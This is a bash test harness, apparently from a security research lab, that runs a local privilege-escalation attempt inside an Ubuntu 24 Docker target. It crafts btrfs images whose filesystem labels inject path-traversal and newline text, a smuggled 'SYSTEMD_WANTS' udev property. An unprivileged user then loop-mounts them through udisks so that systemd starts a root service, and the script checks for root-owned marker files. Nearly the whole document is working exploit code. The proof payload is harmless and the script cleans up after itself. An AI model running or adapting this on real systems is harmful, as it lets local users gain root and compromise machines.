#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
workspace="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log="$workspace/logs/active-udisks-btrfs-udev.out"
mkdir -p "$workspace/logs"

docker exec -i "$container" bash -s <<'EOS'
set -euo pipefail

tmp=/tmp/active-udisks-btrfs-udev
home=/home/selfauth/active-udisks-btrfs-udev
root_marker=/root/active_udisks_btrfs_udev_root
run_marker=/run/active_udisks_btrfs_udev_root
payload_unit=/etc/systemd/system/active-udisks-btrfs-pwn.service

cleanup_target() {
  set +e
  loginctl terminate-user selfauth >/dev/null 2>&1 || true
  systemctl start getty@tty1.service >/dev/null 2>&1 || true
  rm -f /home/selfauth/.bash_profile
  losetup -a | awk -F: '/active-udisks-btrfs-udev/ {print $1}' | xargs -r -n1 losetup -d >/dev/null 2>&1 || true
  systemctl stop active-udisks-btrfs-pwn.service >/dev/null 2>&1 || true
  rm -f "$payload_unit"
  systemctl daemon-reload >/dev/null 2>&1 || true
  systemctl reset-failed active-udisks-btrfs-pwn.service >/dev/null 2>&1 || true
}

rm -rf "$tmp" "$home" "$root_marker" "$run_marker" /tmp/active_udisks_btrfs_udev_root
mkdir -p "$tmp" "$home"
chmod 1777 "$tmp"

id selfauth >/dev/null 2>&1 || useradd -m -s /bin/bash selfauth
echo selfauth:selfauth | chpasswd
usermod -G selfauth selfauth
chown -R selfauth:selfauth "$home"

trap cleanup_target EXIT

cat >"$payload_unit" <<'UNIT'
[Unit]
Description=active udisks btrfs metadata injection marker

[Service]
Type=oneshot
ExecStart=/bin/sh -c 'id > /root/active_udisks_btrfs_udev_root; id > /run/active_udisks_btrfs_udev_root; id > /tmp/active_udisks_btrfs_udev_root'
UNIT
systemctl daemon-reload >/dev/null 2>&1 || true

{
  echo "## target"
  cat /etc/os-release | sed -n '1,8p'
  uname -a
  id attacker
  id selfauth
  echo

  echo "## package versions"
  for pkg in btrfs-progs udisks2 systemd udev polkitd; do
    dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' "$pkg" 2>&1 || true
  done | sort
  echo

  echo "## default service/policy reachability"
  systemctl is-system-running || true
  systemctl is-enabled udisks2.service 2>&1 || true
  systemctl is-active udisks2.service 2>&1 || true
  awk '/org.freedesktop.udisks2.loop-setup/{flag=1} flag{print} /<\/action>/{if(flag) exit}' /usr/share/polkit-1/actions/org.freedesktop.UDisks2.policy
  echo

  echo "## btrfs udev rule and persistent-storage consumers"
  nl -ba /usr/lib/udev/rules.d/64-btrfs.rules
  nl -ba /usr/lib/udev/rules.d/60-persistent-storage.rules | sed -n '136,166p'
  echo

  echo "## build btrfs images"
  truncate -s 160M "$home/single.img"
  mkfs.btrfs -q -f -L 'bt/../SYSTEMD_WANTS=active-udisks-btrfs-pwn.service' "$home/single.img"
  set +e
  btrfstune -f -L $'bt\nSYSTEMD_WANTS=active-udisks-btrfs-pwn.service' "$home/single.img" >"$tmp/btrfstune-newline.out" 2>&1
  echo "btrfstune_newline_rc=$?"
  cat "$tmp/btrfstune-newline.out"
  set -e
  truncate -s 160M "$home/multi-a.img" "$home/multi-b.img"
  mkfs.btrfs -q -f -d raid1 -m raid1 -L 'btmulti' "$home/multi-a.img" "$home/multi-b.img"
  chown -R selfauth:selfauth "$home"
  ls -l "$home"
  for img in "$home"/*.img; do
    echo "### blkid export $img"
    blkid -o udev "$img" 2>&1 | sed -n '1,80p' || true
    echo "### btrfs inspect $img"
    btrfs inspect-internal dump-super -f "$img" 2>&1 | grep -E '^(label|fsid|num_devices|dev_item\\.devid|dev_item\\.uuid)' | sed -n '1,80p' || true
  done
} >"$tmp/root-prep.out" 2>&1

cat >"$home/probe.sh" <<'SH'
#!/bin/bash
set +e
out=/tmp/active-udisks-btrfs-udev/user.out
exec >"$out" 2>&1
id
tty
echo "XDG_SESSION_ID=$XDG_SESSION_ID"
loginctl show-session "$XDG_SESSION_ID" -p Id -p User -p Name -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote
for img in /home/selfauth/active-udisks-btrfs-udev/single.img /home/selfauth/active-udisks-btrfs-udev/multi-a.img; do
  echo "## first-pass loop setup $img"
  udisksctl loop-setup -f "$img" --no-user-interaction
done
udevadm settle --timeout=20 || true
sleep 4
echo "## after first pass"
lsblk --pairs --output NAME,TYPE,FSTYPE,LABEL,UUID,MOUNTPOINT,PATH | sed -n '1,220p'
for dev in $(losetup -a | awk -F: '/active-udisks-btrfs-udev/ {print $1}' | sort); do
  echo "### props $dev"
  udevadm info --query=property --name "$dev" | grep -E '^(DEVNAME|DEVLINKS|ID_FS|ID_BTRFS|SYSTEMD|UDISKS)' | sort
done
echo "## second-pass loop setup multi-b"
udisksctl loop-setup -f /home/selfauth/active-udisks-btrfs-udev/multi-b.img --no-user-interaction
udevadm settle --timeout=20 || true
sleep 6
echo "## after second pass"
lsblk --pairs --output NAME,TYPE,FSTYPE,LABEL,UUID,MOUNTPOINT,PATH | sed -n '1,260p'
for dev in $(losetup -a | awk -F: '/active-udisks-btrfs-udev/ {print $1}' | sort); do
  echo "### props $dev"
  udevadm info --query=property --name "$dev" | grep -E '^(DEVNAME|DEVLINKS|ID_FS|ID_BTRFS|SYSTEMD|UDISKS)' | sort
done
SH
chmod 0755 "$home/probe.sh"
chown selfauth:selfauth "$home/probe.sh"

cat >/home/selfauth/.bash_profile <<'SH'
/home/selfauth/active-udisks-btrfs-udev/probe.sh
exit
SH
chown selfauth:selfauth /home/selfauth/.bash_profile

systemctl stop getty@tty1.service >/dev/null 2>&1 || true
timeout 110 openvt -c 1 -s -f -w -- /bin/login -f selfauth || true
systemctl start getty@tty1.service >/dev/null 2>&1 || true
loginctl terminate-user selfauth >/dev/null 2>&1 || true
rm -f /home/selfauth/.bash_profile
udevadm settle --timeout=20 || true
sleep 8

{
  cat "$tmp/root-prep.out"
  echo
  echo "## active selfauth trigger"
  cat "$tmp/user.out" 2>&1 || true
  echo

  echo "## root-observed btrfs/udev state"
  for dev in $(losetup -a | awk -F: '/active-udisks-btrfs-udev/ {print $1}' | sort); do
    echo "### $dev"
    losetup -l "$dev" || true
    udevadm info --query=property --name "$dev" | grep -E '^(DEVNAME|DEVLINKS|ID_FS|ID_BTRFS|SYSTEMD|UDISKS)' | sort || true
  done
  find /dev/disk/by-label /dev/disk/by-uuid /dev/disk/by-loop-inode /dev/disk/by-loop-ref -maxdepth 1 -mindepth 1 -ls 2>/dev/null | grep -E 'bt|active-udisks-btrfs|loop' || true
  systemctl status active-udisks-btrfs-pwn.service --no-pager 2>&1 | sed -n '1,80p' || true
  echo

  echo "## recent btrfs/udev/systemd journal"
  journalctl -b --no-pager -g 'btrfs|active-udisks-btrfs|ID_BTRFS_READY|udevadm trigger' -n 220 2>&1 || true
  echo

  echo "## root proof checks"
  for p in "$root_marker" "$run_marker" /tmp/active_udisks_btrfs_udev_root; do
    if [ -e "$p" ]; then
      echo "ROOT_PROOF_PRESENT $p"
      ls -l "$p"
      cat "$p"
    else
      echo "ROOT_PROOF_ABSENT $p"
    fi
  done
  echo

  echo "## cleanup health before cleanup"
  systemctl is-system-running || true
  systemctl --failed --no-legend || true
} >"$tmp/root.out" 2>&1

cleanup_target
rm -rf "$home" "$root_marker" "$run_marker" /tmp/active_udisks_btrfs_udev_root

{
  echo
  echo "## cleanup verification"
  losetup -a | grep active-udisks-btrfs-udev || true
  systemctl is-system-running || true
  systemctl --failed --no-legend || true
} >>"$tmp/root.out" 2>&1
EOS

docker exec "$container" cat /tmp/active-udisks-btrfs-udev/root.out > "$log"
docker exec "$container" rm -rf /tmp/active-udisks-btrfs-udev
sed -n '1,320p' "$log"
